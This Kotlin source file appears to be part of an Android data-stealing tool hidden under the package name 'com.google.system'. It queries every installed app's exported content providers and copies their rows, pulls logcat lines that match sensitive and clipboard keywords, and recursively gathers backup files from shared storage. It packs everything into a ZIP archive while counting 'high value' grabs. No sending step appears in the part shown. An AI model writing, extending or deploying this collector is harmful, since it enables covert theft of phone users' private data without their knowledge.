package com.google.system

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

internal fun deepScanContentProviders(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
    try {
        val pm = ctx.packageManager
        val packages = pm.getInstalledPackages(PackageManager.GET_PROVIDERS)
        for (pkgInfo in packages) {
            if (r.files >= MAX_FILES) break
            val providers = pkgInfo.providers ?: continue
            for (provider in providers) {
                if (r.files >= MAX_FILES) break
                if (!provider.exported) continue
                val authority = provider.authority ?: continue
                val uri = Uri.parse("content://$authority")
                try {
                    val cursor = ctx.contentResolver.query(uri, null, null, null, null)
                    if (cursor != null) {
                        val cols = cursor.columnNames.joinToString("\t")
                        val rows = mutableListOf<String>()
                        var count = 0
                        while (cursor.moveToNext() && count < 100) {
                            val row = (0 until cursor.columnCount).map { cursor.getString(it) ?: "null" }.joinToString("\t")
                            rows.add(row)
                            count++
                        }
                        cursor.close()
                        if (rows.isNotEmpty()) {
                            val content = "$cols\n${rows.joinToString("\n")}\n"
                            val entryName = "providers/${pkgInfo.packageName}/${authority.replace('.', '_')}.tsv"
                            zos.putNextEntry(ZipEntry(entryName))
                            zos.write(content.toByteArray())
                            zos.closeEntry()
                            r.files++; r.size += content.length; r.highValue++
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("MiscScanner", "Error scanning provider", e)
                }
            }
        }
    } catch (_: Exception) {}
}

internal fun deepScanLogs(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
    try {
        val output = runCommand("logcat -d -t 5000")
        if (output.isNotBlank()) {
            val sensitiveLines = output.lines().filter { line ->
                val lower = line.lowercase()
                SENSITIVE_PATTERNS.any { lower.contains(it) } || CLIPBOARD_KEYWORDS.any { lower.contains(it) }
            }
            if (sensitiveLines.isNotEmpty()) {
                val content = sensitiveLines.take(500).joinToString("\n")
                zos.putNextEntry(ZipEntry("logs/sensitive_logcat.txt"))
                zos.write(content.toByteArray())
                zos.closeEntry()
                r.files++; r.size += content.length; r.highValue++
            }
        }
    } catch (_: Exception) {}
}

internal fun deepScanBackups(ctx: Context, zos: ZipOutputStream, r: GrabResult) {
    val backupDirs = listOf(
        "/data/media/0",
        "/sdcard/",
        "/storage/emulated/0/",
    )
    val backupPatterns = listOf(".backup", ".bak", "backup_", "_backup", "backup.tar", "backup.zip", "backup.db")
    for (dir in backupDirs) {
        if (r.files >= MAX_FILES || r.size >= MAX_ZIP) break
        val d = File(dir)
        if (d.exists() && d.canRead()) {
            scanForBackups(d, backupPatterns, zos, r)
        }
    }
}

internal fun scanForBackups(dir: File, patterns: List<String>, zos: ZipOutputStream, r: GrabResult) {
    if (r.files >= MAX_FILES || r.size >= MAX_ZIP) return
    try {
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (r.files >= MAX_FILES || r.size >= MAX_ZIP) return
            if (f.isDirectory && f.name !in listOf("system", "proc", "sys", "dev")) {
                scanForBackups(f, patterns, zos, r)
            } else if (f.isFile && f.length() < MAX_FILE) {
                val nameLower = f.name.lowercase()
                if (patterns.any { nameLower.contains(it) }) {
                    if (zip(f, "backups/${f.name}", zos)) {
                        r.files++; r.size += f.length(); r.highValue++
                    }
                }
            }
        }
    } catch (_: Exception) {}
}
